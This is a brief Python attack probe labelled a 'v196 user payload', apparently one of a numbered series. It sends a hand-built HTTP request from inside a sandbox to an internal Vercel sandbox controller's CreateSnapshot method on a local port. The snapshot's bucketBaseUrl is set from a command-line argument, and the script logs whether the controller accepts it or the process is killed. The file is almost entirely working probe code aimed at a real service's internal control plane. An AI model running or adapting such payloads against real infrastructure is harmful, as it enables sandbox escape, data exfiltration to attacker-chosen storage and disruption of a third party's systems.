# -*- coding: utf-8 -*-
"""v196 user payload: CreateSnapshot bucketBaseUrl 变体 (argv[1] 传入)
打印响应; 若进程被杀, 由驱动观测沙箱状态变化"""
import socket, time, json, sys

def log(s, maxlen=3000):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    print('[%.1f] %s' % (time.time(), s), flush=True)

CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'
URL = sys.argv[1] if len(sys.argv) > 1 else 's3://v1.vercel.com/snap/x'

def post(port, path, body, t=25):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(('127.0.0.1', port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 8000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:6000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''

log('=== snapshot url=%s ===' % URL)
st, pay = post(23456, '/' + CTRL + '/CreateSnapshot',
               {'driveId': 'sandbox', 'bucketBaseUrl': URL}, t=25)
log('CTRL -> %s %r' % (st, pay[:1200]))
log('V196U_DONE')
